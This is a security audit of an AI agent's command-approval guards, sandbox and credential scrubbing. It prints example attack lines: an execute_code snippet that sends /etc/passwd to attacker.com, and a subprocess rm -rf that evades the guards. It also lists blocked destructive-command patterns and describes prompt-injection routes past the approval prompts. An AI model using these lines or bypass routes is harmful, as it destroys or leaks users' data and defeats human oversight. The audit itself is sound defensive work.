# Security Audit: Command Execution in Hermes Agent

**Scope:** Command injection, approval bypass, and sandbox escape vectors  
**Files Audited:**
- `tools/terminal_tool.py` — terminal command execution and guard orchestration
- `tools/approval.py` — dangerous command detection, YOLO mode, deny rules
- `tools/code_execution_tool.py` — Python sandbox and RPC mechanism
- `tools/environments/local.py` — subprocess environment sanitization
- `tools/env_passthrough.py` — env passthrough allow-listing

**Date:** 2026-08-13

---

## Executive Summary

The command execution pipeline in Hermes Agent has a **defense-in-depth architecture** with multiple security layers. The design is generally sound, with hardline blocks that cannot be bypassed even by YOLO mode, comprehensive command normalization to resist obfuscation, and multi-tier environment variable sanitization. However, several areas present residual risk or design trade-offs that merit attention.

**Critical finding count:** 0 (no trivially exploitable remote code execution or full approval bypass)  
**High findings:** 3  
**Medium findings:** 4  
**Low / Informational:** 3

---

## 1. Guard Chain Architecture

### How `_check_all_guards()` Works

The guard chain is orchestrated by `check_all_command_guards()` in `tools/approval.py` (line 3532), which is called from `_check_all_guards()` in `tools/terminal_tool.py` (line 368). The execution order is:

1. **Container skip** (line 3548) — isolated backends (Docker without host mounts, Singularity, Modal, Daytona, Vercel Sandbox) skip all guards.
2. **Hardline floor** (line 3555) — unconditional block for catastrophic commands. **Cannot be bypassed by any setting.**
3. **Sudo stdin guard** (line 3565) — blocks `sudo -S` when no `SUDO_PASSWORD` is configured. **Cannot be bypassed by YOLO.**
4. **User deny rules** (line 3574) — `approvals.deny` globs from config.yaml. **Cannot be bypassed by YOLO.**
5. **YOLO / mode=off bypass** (line 3583) — if any of these are active, all remaining checks are skipped.
6. **Permanent allowlist** (line 3586) — previously approved commands pass.
7. **Non-interactive auto-approve** (line 3595) — outside CLI/gateway/ask contexts, commands auto-approve (with cron exceptions).
8. **Tirith security scanner** (line 3667) — content-level threat detection.
9. **Dangerous pattern detection** (line 3706) — regex-based pattern matching.
10. **Interactive approval prompt** — presented to user with combined findings.

---

## 2. Findings

### FINDING H-1: Non-Interactive Auto-Approve Path (HIGH)

**File:** `tools/approval.py`, lines 3593–3659  
**Severity:** HIGH

**Vulnerable Code:**
```python
# Line 3593-3659
is_cli = _is_interactive_cli()
is_gateway = _is_gateway_approval_context()
is_ask = env_var_enabled("HERMES_EXEC_ASK")

if not is_cli and not is_gateway and not is_ask:
    # Cron sessions: respect cron_mode config
    if _is_cron_approval_context():
        if _get_cron_approval_mode() == "deny":
            # ... block dangerous commands ...
        # cron_mode: approve — fall through to auto-approve
    return {"approved": True, "message": None}  # <-- line 3659
```

**Issue:** When the agent is running outside a CLI, gateway, or ask context (e.g., programmatic invocation via `AIAgent.chat()`, batch processing, ACP adapter without proper context propagation, or any context where the three flags are all false), **all dangerous commands are auto-approved**. The hardline floor and deny rules still fire, but the entire dangerous-pattern and Tirith layer is skipped.

**Attack Path:**
1. An attacker crafts a prompt injection that causes the agent to run a dangerous command (e.g., `git push --force`, `rm -rf ./important_data/`).
2. If the agent is running in a context where `_is_interactive_cli()`, `_is_gateway_approval_context()`, and `HERMES_EXEC_ASK` are all false (e.g., a batch runner, a custom integration, or an ACP session that didn't propagate context flags).
3. The command passes through the hardline floor (it's not catastrophic) and deny rules (none match).
4. The auto-approve path at line 3659 returns `{"approved": True}` without checking dangerous patterns.

**Impact:** Data loss, repository history corruption, or unauthorized system modification for any dangerous (but not hardline-blocked) command.

**Mitigating Factors:**
- Hardline patterns still block catastrophic commands (`rm -rf /`, `mkfs`, fork bombs, etc.).
- User deny rules still fire.
- This is documented as a deliberate design trade-off ("trusted-by-config") in the code comments.
- Cron sessions have their own `cron_mode: deny` option that blocks dangerous commands.

**Recommendation:** Consider defaulting to fail-closed (deny) for non-interactive contexts, or at minimum adding a config option `approvals.non_interactive_mode: deny` that operators can set. The current default (approve) was chosen for backward compatibility but creates a silent approval gap.

---

### FINDING H-2: execute_code Auto-Approve in Non-Interactive Contexts (HIGH)

**File:** `tools/approval.py`, lines 4086–4092  
**Severity:** HIGH

**Vulnerable Code:**
```python
# Line 4086-4092
# Only gateway/ask contexts get the one-shot whole-script approval.
if not is_gateway and not is_ask:
    return {"approved": True, "message": None}
```

**Issue:** `check_execute_code_guard()` auto-approves arbitrary Python code execution in non-gateway, non-ask contexts (including CLI interactive sessions, which get per-call terminal guards instead but no whole-script guard). The `execute_code` tool can spawn subprocesses, call `os.system()`, use `ctypes`, or perform any other arbitrary operation — none of which pass through the `terminal()` dangerous-pattern detection.

**Attack Path:**
1. A prompt injection causes the agent to use `execute_code` with a Python script.
2. The script contains `import subprocess; subprocess.run(["rm", "-rf", "/important"])`.
3. In a non-gateway/non-ask context (including CLI), `check_execute_code_guard` returns approved at line 4092.
4. The subprocess call inside the script bypasses all dangerous-command detection because it never passes through `terminal()` or `check_all_command_guards()`.

**Impact:** Arbitrary code execution bypassing all shell-command pattern guards.

**Mitigating Factors:**
- The sandbox's RPC-based tool dispatch for `terminal` calls does go through `handle_function_call`, which applies its own guards.
- The sandbox environment is scrubbed of API keys and credentials.
- CLI interactive sessions have per-call terminal approval for commands issued through the `terminal` RPC tool.
- Direct subprocess calls from within the script are the gap — they bypass the RPC path entirely.

**Recommendation:** Consider applying the whole-script approval gate in CLI contexts as well, or implementing a seccomp/namespace sandbox that prevents direct subprocess execution from Python scripts, forcing all command execution through the RPC tool channel.

---

### FINDING H-3: YOLO Mode Activation Vectors (HIGH)

**File:** `tools/approval.py`, lines 32–35, 3583  
**Severity:** HIGH (design risk, not a bypass)

**Code:**
```python
# Line 35
_YOLO_MODE_FROZEN: bool = is_truthy_value(os.getenv("HERMES_YOLO_MODE", ""))

# Line 3583
if _YOLO_MODE_FROZEN or is_current_session_yolo_enabled() or approval_mode == "off":
    return {"approved": True, "message": None}
```

**Issue:** Three independent paths can disable all approval prompts (beyond hardline/deny):
1. `HERMES_YOLO_MODE` env var (frozen at import time — good mitigation against runtime mutation).
2. Per-session `/yolo` toggle in the gateway.
3. `approvals.mode: off` in config.yaml.

While YOLO mode freezing at import time (line 35) is an excellent defense against mid-session prompt injection toggling it on, the per-session `/yolo` gateway toggle (`is_session_yolo_enabled`) and `approvals.mode: off` config setting remain live checks.

**Attack Path:**
1. In a gateway context, a prompt injection convinces the agent to suggest the user type `/yolo`.
2. Or: a shared config.yaml has `approvals.mode: off` set by one user, affecting all sessions.
3. Once active, all dangerous commands auto-approve (except hardline and deny rules).

**Mitigating Factors:**
- `/yolo` requires the *user* to type the command — the agent cannot toggle it.
- `_YOLO_MODE_FROZEN` freezing prevents runtime env var mutation.
- Hardline floor and deny rules still fire under YOLO.

**Recommendation:** Consider adding a `security.allow_yolo: false` config option that operators can set to globally disable the `/yolo` toggle for gateway sessions in sensitive deployments.

---

### FINDING M-1: Command Parser Length Limits as Fail-Closed Gate (MEDIUM)

**File:** `tools/approval.py`, lines 1254–1285  
**Severity:** MEDIUM

**Code:**
```python
_MAX_DETECTION_COMMAND_CHARS = 128_000
_MAX_SEPARATOR_FREE_COMMAND_CHARS = 4_096
_MAX_DETECTION_SEGMENTS = 25_000

def _command_parser_limit_exceeded(command: str) -> bool:
    if len(command) > _MAX_DETECTION_COMMAND_CHARS:
        return True
    if (
        len(command) > _MAX_SEPARATOR_FREE_COMMAND_CHARS
        and not any(char in command for char in ";&|\n")
    ):
        return True
    # ...
```

**Issue:** Commands exceeding 128KB or 4KB without separators are treated as hardline-blocked (fail-closed). This is a correct security posture. However, the 4KB separator-free limit is assessed against the *raw* command before normalization, which means a command with embedded ANSI escapes, null bytes, or Unicode could inflate past the limit and be blocked even though the actual content is benign.

**Attack Path (evasion attempt):**
1. An attacker constructs a command just under 128KB with a dangerous payload at the end.
2. The command normalization and variant generation process it.
3. If the dangerous pattern appears only in later variants or after normalization, it could theoretically evade detection.

**Assessment:** The fail-closed design means this is a denial-of-service concern (false positives blocking legitimate long commands), not an evasion path. The architecture correctly blocks over-length commands rather than silently allowing them.

---

### FINDING M-2: Container Guard Skip for Docker Without Host Mounts (MEDIUM)

**File:** `tools/approval.py`, lines 3215–3226, 3548  
**Severity:** MEDIUM

**Code:**
```python
def _should_skip_container_guards(env_type: str, has_host_access: bool = False) -> bool:
    if env_type == "docker":
        return not has_host_access
    return env_type in ("singularity", "modal", "daytona", "vercel_sandbox")
```

**Issue:** When the Docker backend has no host mounts detected by `_docker_has_host_access()`, all approval guards (including dangerous-pattern detection and Tirith) are skipped. The `_docker_has_host_access()` check in `terminal_tool.py` (lines 359–365) only detects host mounts through two paths:
1. `config.docker_mount_cwd_to_workspace` is true.
2. Docker volumes contain host-path prefixes (`/`, `~`, `./`, `../`, or Windows drive letters).

**Attack Path:**
1. A Docker sandbox is configured with a volume that uses a Docker named volume (e.g., `mydata:/data`) — not detected as a host path.
2. The named volume is actually backed by a bind mount to sensitive host directories (via Docker volume driver or external configuration).
3. All approval guards are skipped, and the agent can run `rm -rf /data` without approval.

**Mitigating Factors:**
- Named Docker volumes backed by bind mounts are an unusual configuration.
- The hardline floor *is* also skipped, but the actual destructive impact depends on what's mounted.
- This is a correct design trade-off for typical Docker sandboxes (which are isolated).

**Recommendation:** Document this behavior clearly and consider a config option `security.docker_always_guard: true` for security-sensitive deployments.

---

### FINDING M-3: Sudo Password Handling and Caching (MEDIUM)

**File:** `tools/terminal_tool.py`, lines 969–1054  
**Severity:** MEDIUM

**Code:**
```python
def _transform_sudo_command(command: str | None) -> tuple[str | None, str | None]:
    # ...
    _configured_password = get_secret("SUDO_PASSWORD")
    # ...
    if has_configured_password or sudo_password:
        password_line = sudo_password + "\n"
        return transformed, password_line * sudo_count
```

**Issue:** When `SUDO_PASSWORD` is configured, the password is piped to every `sudo` invocation via stdin (`sudo -S -p ''`). The password is replicated `sudo_count` times (one per `sudo` invocation in the command). This design is necessary for non-interactive execution but creates risks:

1. **Password in memory:** The password string persists in the Python process memory for the lifetime of the session (cached via `_set_cached_sudo_password`).
2. **Password replication:** For compound commands with many `sudo` invocations, the password string is replicated proportionally.
3. **The `_check_sudo_stdin_guard`** (approval.py lines 500–516) blocks `sudo -S` when `SUDO_PASSWORD` is NOT configured, preventing brute-force guessing. This is a strong mitigation.

**Attack Path:**
1. An attacker with access to `/proc/<pid>/maps` or core dumps could extract the cached sudo password from the Python process.
2. This is a local privilege escalation path for an attacker who already has read access to the process memory.

**Mitigating Factors:**
- The sudo stdin guard blocks password guessing when `SUDO_PASSWORD` is not configured.
- The `_rewrite_real_sudo_invocations` parser correctly identifies only command-position `sudo` tokens, not `sudo` appearing in strings or comments.
- Session caching with `_set_cached_sudo_password` reduces repeated prompts.

---

### FINDING M-4: execute_code Sandbox — No Process-Level Isolation (MEDIUM)

**File:** `tools/code_execution_tool.py`, lines 1431–1505  
**Severity:** MEDIUM

**Code:**
```python
# Line 1496-1505
proc = subprocess.Popen(
    [_child_python, _script_path],
    cwd=_child_cwd,
    env=child_env,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    stdin=subprocess.DEVNULL,
    start_new_session=True,
    # ...
)
```

**Issue:** The `execute_code` sandbox runs as a regular subprocess with `start_new_session=True`. There is no OS-level sandboxing (no seccomp, no namespaces, no cgroups, no chroot). The "sandbox" is:
1. **Environment scrubbing** — API keys and secrets are removed from the child's environment.
2. **Tool allow-listing** — only 7 tools are available via RPC (`web_search`, `web_extract`, `read_file`, `write_file`, `search_files`, `patch`, `terminal`).
3. **RPC authentication** — a `secrets.token_urlsafe(32)` token protects the Unix domain socket.
4. **File permissions** — the UDS socket has `chmod 0o600`.

However, the child process has full access to:
- The filesystem (read/write any file the user can access).
- Network (can make arbitrary HTTP requests, exfiltrate data).
- Process creation (can spawn subprocesses that bypass the RPC tool channel).
- System calls (can use `ctypes` to call arbitrary system functions).

**Attack Path:**
1. A prompt injection causes `execute_code` to run: `import urllib.request; urllib.request.urlopen("https://attacker.com/exfil?" + open("/etc/passwd").read())`.
2. The script runs as a regular subprocess with network access.
3. No environment variables with API keys leak (scrubbed), but filesystem data is exfiltrable.

**Mitigating Factors:**
- The environment is thoroughly scrubbed of credentials (see next section).
- The `check_execute_code_guard` gate blocks execution in gateway/ask contexts without approval.
- `_TERMINAL_BLOCKED_PARAMS` (line 646) prevents sandbox scripts from using `background`, `pty`, `notify_on_complete`, or `watch_patterns` on terminal calls.

**Recommendation:** Consider adding seccomp filtering or namespace isolation for the sandbox child process on Linux. At minimum, document the sandbox's limitations clearly for operators.

---

### FINDING L-1: Environment Variable Sanitization — Comprehensive Coverage (LOW/Informational)

**File:** `tools/environments/local.py`, lines 225–571; `tools/code_execution_tool.py`, lines 149–280  
**Severity:** LOW (informational — this is a strength, not a weakness)

**Architecture Summary:**

The environment sanitization uses a **three-layer defense:**

**Layer 1: Terminal subprocess env (`_sanitize_subprocess_env`, local.py line 456):**
- Strips all vars in `_HERMES_PROVIDER_ENV_BLOCKLIST` (dynamically built from provider registry + tool config + messaging config — ~80+ variables).
- Strips all vars matching `_is_hermes_internal_secret()` patterns (`AUXILIARY_*_API_KEY`, `AUXILIARY_*_BASE_URL`, `GATEWAY_RELAY_*_SECRET/KEY/TOKEN`).
- Strips `_HERMES_PROVIDER_ENV_FORCE_PREFIX` prefixed vars.
- Strips `VIRTUAL_ENV` and `CONDA_PREFIX` venv markers.
- Honors `env_passthrough` for skill-declared vars, but **refuses to passthrough Hermes-managed credentials** (enforced in `env_passthrough.py` lines 93–100, 113–121, 147–157).

**Layer 2: execute_code sandbox env (`_scrub_child_env`, code_execution_tool.py line 208):**
- **Stricter** than terminal: blocks any var whose name contains `KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `CREDENTIAL`, `PASSWD`, `AUTH`, `DSN`, `WEBHOOK`, `CREDS`, `BEARER`, `APIKEY`.
- Only allows vars matching safe prefixes (`PATH`, `HOME`, `USER`, `LANG`, `LC_`, `TERM`, `TMPDIR`, `TMP`, `TEMP`, `SHELL`, `LOGNAME`, `XDG_`, `PYTHONPATH`, `VIRTUAL_ENV`, `CONDA`).
- Explicit allowlist for operational `HERMES_*` vars (only 5 allowed).
- Respects `env_passthrough` for skill-declared vars (with the same credential refusal guard).

**Layer 3: Non-terminal subprocess env (`hermes_subprocess_env`, local.py line 574):**
- **Tier 1 (always strip):** `_ALWAYS_STRIP_KEYS` — 21 specific high-value secrets (GitHub tokens, bot tokens, relay auth, remote compute keys).
- **Tier 2 (conditional):** Full `_HERMES_PROVIDER_ENV_BLOCKLIST` unless `inherit_credentials=True`.
- Always strips `_is_hermes_internal_secret()` matches regardless of `inherit_credentials`.

**Residual Risk:** Operator-defined environment variables whose names don't contain any of the `_SECRET_SUBSTRINGS` and aren't in the blocklist will pass through to sandbox children. For example, a custom variable named `MY_DATABASE_URL` (containing `DATABASE` but not `KEY`, `TOKEN`, etc.) would pass through the execute_code sandbox. However, `DATABASE` is not in `_SECRET_SUBSTRINGS`, so a variable like `DATABASE_PASSWORD` would be caught by `PASSWORD`.

**Assessment:** The coverage is comprehensive. The three-layer approach with progressively stricter filtering is well-designed. The env_passthrough credential-refusal guard (blocking Hermes-managed credentials from being re-allowed) closes the skill-injection attack vector documented in GHSA-rhgp-j443-p4rf.

---

### FINDING L-2: Deny Rule Evasion via Globbing Limitations (LOW)

**File:** `tools/approval.py`, lines 541–569  
**Severity:** LOW

**Code:**
```python
def _match_user_deny_rule(command: str) -> str | None:
    # ...
    for command_variant in _command_detection_variants(command):
        candidate = command_variant.lower().strip()
        for pattern in globs:
            if fnmatch.fnmatchcase(candidate, pattern.lower()):
                return pattern
    return None
```

**Issue:** Deny rules use `fnmatch.fnmatchcase` which only supports `*`, `?`, and `[seq]` patterns. This is limited compared to full regex. However, the function runs over all `_command_detection_variants`, which includes deobfuscated forms, subcommand extraction, and quoted-newline handling.

**Attack Path (theoretical):**
1. User sets deny rule `*docker*rm*` to block Docker container removal.
2. Attacker uses `docker    rm` (multiple spaces) or Unicode spacing — normalization handles this.
3. Attacker uses `d""ocker rm` (empty-quote insertion) — `_command_detection_variants` handles this via shell word parsing.
4. Most practical evasion attempts are covered by the variant generation.

**Assessment:** The combination of fnmatch + variant generation provides adequate coverage. The main limitation is that fnmatch cannot express negation or alternation, but deny rules are intended as a user-configurable safety net, not the primary defense layer.

---

### FINDING L-3: RPC Token Security in execute_code (LOW/Informational)

**File:** `tools/code_execution_tool.py`, lines 1398, 703–711  
**Severity:** LOW

**Code:**
```python
# Line 1398
rpc_token = secrets.token_urlsafe(32)

# Lines 703-711
if not rpc_token or not secrets.compare_digest(
    str(request.get("token") or "").encode(), rpc_token.encode()
):
    resp = tool_error("Unauthorized RPC request")
    conn.sendall((resp + "\n").encode())
    continue
```

**Assessment:** The RPC authentication is well-implemented:
- Uses `secrets.token_urlsafe(32)` (cryptographically random, 256-bit entropy).
- Uses `secrets.compare_digest` for constant-time comparison (timing attack resistant).
- UDS socket has `chmod 0o600` (owner-only access).
- On Windows, TCP loopback on ephemeral port limits exposure to local user processes.

No issues found in the RPC authentication mechanism.

---

## 3. Command Detection Robustness Analysis

### Normalization (`_normalize_command_for_detection`)

The normalizer strips:
- ANSI escape sequences
- Null bytes
- Unicode non-ASCII characters (important for homoglyph attacks)
- Shell line continuations (`\` + newline)
- Home directory paths (folded to `~/`)

### Variant Generation (`_command_detection_variants`)

Generates multiple detection forms:
- Original normalized command
- Individual pipeline/separator segments
- Subcommand extraction (e.g., `bash -c "rm -rf /"` extracts `rm -rf /`)
- Shell word deobfuscation (e.g., `r""m` → `rm`)
- Quoted-newline handling

### Hardline Patterns (12 patterns)

Cover: `rm -rf /` (with path normalization for `//`, `/.`, `/..`), `rm -rf ~`, system directory deletion, `mkfs`, `dd` to block devices, fork bombs, `kill -1`, `shutdown`/`reboot`/`halt`/`poweroff`, `init 0/6`, `systemctl poweroff/reboot`, `telinit 0/6`.

### Dangerous Patterns (47+ patterns)

Cover: Recursive delete, Windows destructive commands, PowerShell encoded commands, chmod 777, SQL DROP/DELETE/TRUNCATE, system file overwrites, remote-to-shell pipes, git destructive ops, sudo privilege flags, Docker/container lifecycle, Hermes self-termination, and many more.

**Assessment:** The pattern set is extensive and well-maintained. The variant generation and normalization make simple obfuscation ineffective. The most likely evasion path is not through shell obfuscation but through the `execute_code` subprocess bypass (Finding M-4) or the non-interactive auto-approve path (Finding H-1).

---

## 4. Positive Security Design Patterns

1. **YOLO mode frozen at import time** (approval.py line 35) — prevents mid-session prompt injection from enabling YOLO.
2. **Hardline floor fires before YOLO** — catastrophic commands are blocked regardless of any setting.
3. **Deny rules fire before YOLO** — user-defined blocks cannot be overridden by any mode.
4. **Sudo stdin guard fires before YOLO** — password guessing is blocked unconditionally.
5. **env_passthrough credential refusal** (env_passthrough.py lines 93–100) — skills cannot register Hermes-managed credentials for passthrough.
6. **`_is_hermes_internal_secret()` is unconditional** — dynamic secrets are stripped regardless of passthrough or inherit_credentials settings.
7. **RPC token + constant-time comparison** — sandbox tool calls are authenticated and timing-attack resistant.
8. **`_TERMINAL_BLOCKED_PARAMS`** — sandbox scripts cannot use background execution or PTY.
9. **Command variant generation** — deobfuscation handles quoting tricks, empty-quote insertion, and subcommand extraction.
10. **Cross-session leak guard** (`_inject_session_context_env`) — prevents session identity leakage across concurrent gateway sessions.

---

## 5. Recommendations Summary

| Priority | Finding | Recommendation |
|----------|---------|----------------|
| HIGH | H-1: Non-interactive auto-approve | Add `approvals.non_interactive_mode` config option, default to `deny` |
| HIGH | H-2: execute_code auto-approve | Extend whole-script approval to CLI contexts |
| HIGH | H-3: YOLO activation vectors | Add `security.allow_yolo` config option for sensitive deployments |
| MEDIUM | M-2: Docker container guard skip | Document behavior; add `security.docker_always_guard` option |
| MEDIUM | M-3: Sudo password caching | Document in-memory password persistence; consider secure memory wiping |
| MEDIUM | M-4: No process-level sandbox | Add seccomp/namespace isolation on Linux; document limitations |
| LOW | M-1: Parser length limits | No action needed (fail-closed is correct) |
| LOW | L-2: Deny rule globbing | No action needed (variant generation compensates) |

---

## 6. Methodology

This audit was conducted through static analysis of the source code. The following techniques were used:
- Manual code review of all guard chain functions and their call sites
- Data flow analysis from user input through normalization, detection, and approval
- Identification of all bypass paths (YOLO, cron, container, non-interactive)
- Analysis of environment variable filtering across all three spawn surfaces
- Review of sandbox RPC authentication and tool allow-listing
- Cross-referencing between terminal and execute_code approval paths to identify gaps
